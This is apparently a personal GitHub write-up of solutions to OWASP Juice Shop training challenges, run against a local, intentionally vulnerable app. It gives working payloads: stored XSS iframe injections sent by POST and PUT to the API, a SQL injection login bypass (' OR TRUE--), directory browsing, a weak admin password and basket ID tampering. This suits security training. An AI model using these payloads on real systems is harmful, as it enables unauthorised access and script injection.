# OWASP-juice-shop-solutions
This repo holds my solutions for the OWASP Juice Shop challenges
## 1. Confidential Document
Navigate to the "About Us" page. There is a link in the middle of the paragraph that is highlighted green. Click that link and you will be redirected to `localhost:3000/ftp/legal.md`. We want to access the content in this file's parent directory. This can be easily accomplished by changing the URL to `localhost:3000/ftp`. Open the `acquisitions.md` file to complete the challenge.
## 2. Client-side XSS Protection
Create a new account with the malicious payload as the user's email. The application sanitizes emails in the client-side but not in the backend. Therefore, one can by-pass the client-side sanitization by submitting a POST request to http://localhost:3000/api/Users of the form:
```
{"email": "<iframe src=\"javascript:alert(`xss`)\">", "password":""}
```
Note that the inside quotes are escaped.
## 3. Exposed Metrics
The linked documentation for prometheus mentions a directory called `/metrics` as the standard endpoint. Simply naviagte to `localhost:3000/metrics` to reveal metric information and complete the challenge.
## 4. Missing Encoding
Inspect the broken image. Find the src link: 
```
http://localhost:3000/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg
```
Visit this link in your browser. Then, check the Network tab. It will show that the actual visited links reads: 
```
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-
``` 
which is everything up until the first `#` symbol. The website can render unencoded pound signs, but your browser cannot. Encode each `#` as `%23` to get the solution URL: 
```
http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
```
## 5. Web3 Sandbox
Search for `sandbox` in main.js to reveal the path:
```
localhost:3000/#/web3-sandbox
```
Navigating to this URL solves the challenge.
## 6. Login Admin
For this challenge, a SQL injection attack must be used to login without the right credentials. A common approach for these problems is to enter quotes `'` to manipulate the sql query string. Enter `'` as the username and any value as the password and then click login. Inspect the Network tab to see how the client interpreted this login. You should see a line in the response like this:
```
"sql": "SELECT * FROM Users WHERE email = ''' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
This produces a sqlite compile error because there is an unexpected quote within the query. In order to login, we need the query to return at least one record. This can be accomplished by adding a clause that always evaluates to true, like: `email = '' OR TRUE`. This is close to the final solution but there is still an error with the quote formatting:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```

 this is resolved by commenting out the rest of the internal code by inputting an email as:
```
' OR TRUE--
```
Now the full query reads as:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE--' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
which is effectively:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE"
```
Since this query always return TRUE, the database will return every record. Since the application expects only one user to be returned, it will automatically take the first record from the result set. In this case it will be the admin login. The first user is often the admin because user IDs are usually incremented from 1 and admin accounts are often created first in a database.
## 7. Admin Section
Navigate to this URL:
```
http://localhost:3000/#/administration
```
## 8. Password Strength
email: `admin@juice-sh.op`
password: `admin123`

## 9. View Basket
Change the `bid` to 1 in developer tools -> Session settings. Navigate away from basket and then back to basket.
## 10. Empty User Registration
To solve this challenge you have to modify the client-side javascript. Inspect the "Register" button on the registration page. Find this element in the code:
```
<button _ngcontent-jwc-c32="" type="submit" id="registerButton" mat-raised-button="" color="primary" aria-label="Button to complete the registration" class="mat-focus-indicator mat-raised-button mat-button-base mat-primary mat-button-disabled" disabled="true"><span class="mat-button-wrapper"><i _ngcontent-jwc-c32="" class="material-icons"> person_add </i> Register </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
```
Delete the portion that says `disabled="true"` then click "Register" on the UI.
## 11. Five-Star Feedback
This solution requires that you have completed number 6. Login Admin and number 7. Admin Section. Login as the admin and navigate to the admin section (`http://localhost:3000/#/administration`). Click the trash can icon next to the one five-star review.
## 12. API Only XSS
To find potential vulnerabilities for an API XSS attack, you can search `main.js` for vulnerable functions like `bypassSecurityTrustHtml`. There are a few places in the code where this function is found. One of those places is in the Product Description:
```
trustProductDescription(e) {
 for (let o = 0; o < e.length; o++)
 e[o].description = this.sanitizer.bypassSecurityTrustHtml(e[o].description)
}
```
This tells us that we should try to replace a product description with the XSS attack payload. Then, when a user opens the product information on the UI, they will get an XSS notification.
 Determining the exact format of the payload takes some tinkering around with postman and the API. Ultimately, you will need to identify the link for a specific product, for example, the link to the Banana Juice is:
```
http://localhost:3000/api/Products/6
```
Use a `PUT` request to update the description in the format: 
```
{"description":"<iframe src=\"javascript:alert(`xss`)\">"}
```
After sending the request, refresh the website and the challenge will be solved. Click on the Banana Juice product to see the attack in action.
